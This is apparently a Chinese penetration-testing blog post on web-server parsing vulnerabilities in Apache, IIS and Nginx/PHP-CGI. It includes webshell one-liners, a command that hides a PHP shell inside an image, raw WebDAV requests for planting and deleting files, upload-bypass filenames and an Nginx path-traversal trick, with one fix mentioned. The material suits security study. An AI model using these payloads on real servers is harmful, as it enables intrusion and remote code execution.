---
title: Web Server解析漏洞
mathjax: true
date: 2019-04-27 22:12:07
tags:
- Apache解析漏洞
- IIS解析漏洞
- Nginx解析漏洞
- PHP CGI路径解析问题
categories:
- 渗透测试
- 文件上传
---

## 1. Apache解析漏洞
### 1.1. 未知后缀解析漏洞
#### 1.1.1. 影响版本
* `Apache 1.x`
* `Apache 2.x`

#### 1.1.2. 原理
* Apache对于⽂件名的解析是**从后往前解析**的, 直到遇⻅⼀个Apache认识的⽂件类型为⽌.
* 比如一个文件名为`xxx.x1.x2.x3`的文件, Apache会从`x3`的位置往`x1`的位置开始尝试解析, 如果`x3`不属于Apache能解析的扩展名, 那么Apache会尝试去解析`x2`的位置, 这样**一直从后往前尝试, 直到遇到一个能解析的扩展名为止, 如果都不认识,则会暴露其源代码**.
* 具体来说, 例如：`Phpshell.php.abc.abc`, 因为Apache不认识`.abc`这个⽂件类型，所以会⼀直遍历后缀到`.php`, 然后认为这是⼀个PHP类型的⽂件.
<!-- more-->
* 那么Apache认识哪些扩展名呢?
    * windows: 在Apache安装目录下`/conf/mime.types`文件中有详细的扩展名列表,这种方法可以绕过基于黑名单的检查
    * Ubuntu: 在`/etc/mime.types`文件中

#### 1.1.3. 利用
* ⽐如`.rar`是⼀个合法的上传需求, 在应⽤⾥只判断⽂件的后缀是否是`.rar`, 最终⽤户上传的是`phpshell.php.rar.rar.rar`, 从⽽导致脚本被执⾏.

### 1.2. 换行解析漏洞
#### 1.2.1. 影响版本
* Apache版本在`2.4.0`到`2.4.29`

#### 1.2.2. 原理
* 正则中, `$`可以匹配行尾或者一个`换行符`
* 如果目标Apache使用如下方法来禁止某目录执行PHP

```
<FilesMatch "\.(?i:php|php3|php4)$">
Order allow, deny
Deny from all
</FilesMatch>
```

* 我们可以上传一个后缀末尾包含换行符的php文件, 来绕过这个`FilesMatch`

> 默认的Apache配置就可以利用, 默认的Apache配置就使用了如下的`FilesMatch`

```
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

#### 1.2.3. 利用
* 上传一个包含webshell的php文件, 如文件名是`1.php`, 然后用bp抓包, 用hex功能在`1.php`后面添加一个`\x0A`

![](_v_images/20190427220220641_716208242.png)

* 然后访问`1.php%0A`, 即可发现getshell

## 2. IIS解析漏洞

### 2.1. IIS6.0
* `IIS 6.0`再解析文件的时候存在以下三个解析漏洞：
1. 当**文件**为`*.asp;1.jpg`时,`IIS 6.0`会以`ASP脚本`来执行
2. 当建立`*.asa`,`*.asp`格式的**文件夹**时,其目录下的任意文件都将被IIS当作`asp`文件来解析
3. `WebDav(Web-based Distributed Authoring and Versioning)`漏洞(对IIS写权限的利用),如果服务器开启`WebDav`,并且支持`PUT`,`Move`,`Copy`,`Delete`等方法,就可能存在安全隐患


#### 2.1.1. 文件类型

Ⅰ:正常：`www.xxx.com/logo.jpg`

Ⅱ:触发漏洞：`www.xxx.com/logo.asp;abc.jpg`

* 这类似0x00字符截断⽂件名, 不过截断字符变成了分号`;`
* 按照Ⅰ来上传访问`logo.jpg`，文件会被当成是jpg图片来解析，如果上传访问`logo.asp;abc.jpg`，IIS 6会将此⽂件解析为`logo.asp`，⽂件名被截断了, **被当成`asp`文件来处理, 从⽽导致脚本被执⾏**, 而不会去管`abc.jpg`(如果IIS支持PHP，那么`logo.php;abc.jpg`也会被当成`PHP`文件执行）



#### 2.1.2. 文件夹类型
Ⅰ:正常：`www.xxx.com/image/logo.jpg`

Ⅱ:触发漏洞：`www.xxx.com/image.asp/logo.jpg`

* 按照Ⅰ来上传访问`logo.jpg`，文件会被当成是`jpg`图片来解析，如果将`logo.jpg`上传到`*.asp`如`image.asp`目录下，**文件就会被当成`asp`文件来处理**。（如果IIS支持PHP，那么`image.php文件夹`下的文件也会被当做`PHP`文件解析。）

#### 2.1.3. WebDav
##### 2.1.3.1. 利用条件
1. 目录支持写权限
2. 开启了WebDav
3. 勾选了`脚本资源访问`复选框

> 攻击者常用`PUT`方法上传危险脚本文件, 然后用`move`方法改为脚本文件, 从而执行webshell, 测试步骤如下:

##### 2.1.3.2. 通过`OPTIONS`探测服务器所支持的HTTP方法
```
请求：
OPTIONS / HTTP/1.1
Host:www.example.com

响应：
。。。
Allow:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH
。。。
```


##### 2.1.3.3. 通过`PUT`方法向服务器上传脚本文件
```
请求：
PUT /a.txt HTTP/1.1
Host:www.example.com
Content-Length:30

<%eval request("chopper")%>
```

##### 2.1.3.4. 通过`Move`或`Copy`方法改名
```
请求：
COPY /a.txt HTTP/1.1
Host:www.example.com
Destination:http://www.example.com/cmd.asp
```

##### 2.1.3.5. 使用`DELETE`方法，攻击者还可以删除服务器上的任意文件
```
请求：
DELETE /a.txt HTTP/1.1
Host:www.example.com
```

> 桂林老兵曾写过一款针对WebDav漏洞的软件:`IIS Write`,利用这款软件,可以快速探测服务器是否存在WebDav漏洞

### 2.2. IIS7.0以上
#### 2.2.1. 影响版本
```
IIS7.0(Win2008R1+IIS7.0)
IIS7.5(Win2008R2+IIS7.5)
```

#### 2.2.2. 原理
* `IIS7.0/7.5`是对`php解析`时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”`/任意文件名.php`”就**会按照`php`的方式去解析**。（例如：`webshell.jpg/x.php`）

* IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”`任意文件名/任意文件名.php`”这个漏洞其实是出现自`php-cgi `的漏洞， 所以其实跟IIS自身是无关的。

#### 2.2.3. 利用
* 将shell语句，如  

```
<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
```

写在文本`xx.txt`中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片`xx.jpg`后

```
copy xx.jpg/b + xx.txt/a test.jpg
```

* 上传`test.jpg`，然后访问`test.jpg/.php`或`test.jpg/abc.php`当前目录下就会生成一句话木马 `shell.php`

## 3. Nginx解析漏洞
### 3.1. 畸形解析漏洞
#### 3.1.1. 原理
* 对任意文件名，在后面添加”`/任意文件名.php`”的解析漏洞，比如图片木马文件名是`test.jpg`，可以添加为`test.jpg/x.php`进行**解析攻击**,那么`test.jpg`会被当成PHP脚本来解析。注意,此时的`x.php`是不存在的
* 这种解析漏洞其实是`PHP CGI`漏洞,在PHP配置文件中有个关键的选项:`cgi.fix_pathinfo`,这个选项在某些版本中是默认开启的

```
cgi.fix_pathinfo = 1
```

* 在开启时访问URL,比如: `http://www.xxser.com/x.txt/x.php`,`x.php`是不存在的文件,所以**PHP会`向前递归`解析**,于是造成了解析漏洞.由于Nginx和PHP配合很容易造成这种漏洞,所以,PHP CGI漏洞常常被认为是Nginx解析漏洞,所以其实跟Nginx自身是无关的。

#### 3.1.2. 利用
* 将shell语句，如  
```php
<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
```
写在文本`xx.txt`中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀）

* 然后用命令将shell语句附加在正常图片`xx.jpg`后

```
copy xx.jpg/b + xx.txt/a test.jpg
```

* 上传`test.jpg`，然后访问`test.jpg/.php`或`test.jpg/abc.php`,当前目录下就会生成一句话木马 `shell.php`

#### 3.1.3. 修复
* 将`cgi.fix_pathinfo` 设置为0

### 3.2. 空字节代码执行漏洞
#### 3.2.1. 原理
* 低版本的Nginx可以在任意文件名后面添加`%00.php`进行**解析攻击**。

```
Nginx0.5.
Nginx0.6.
Nginx0.7. <= 0.7.65
Nginx0.8. <= 0.8.37
```

#### 3.2.2. 利用
* 比如在图片后附加php代码,然后通过访问
```
xx.jpg%00.php
```
来执行其中的代码

### 3.3. 文件名逻辑漏洞(CVE-2013-4547)
* 受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x
* 正常上传一个附加代码的图片`test.jpg`，访问时后面+`空格`+`\\0`+`.php`，即让图片作为php文件解析

```
"/test.jpg \\0.php"
```

### 3.4. 配置不当目录穿越
* 如果绝对路径`/home/`的URL映射是网站目录`/files/`，配置写成了`/files`

```
location /files {
    alias /home/;
}
```

* 就可以访问`/files../`，穿越路径，访问到绝对路径根目录`/`下的文件列表
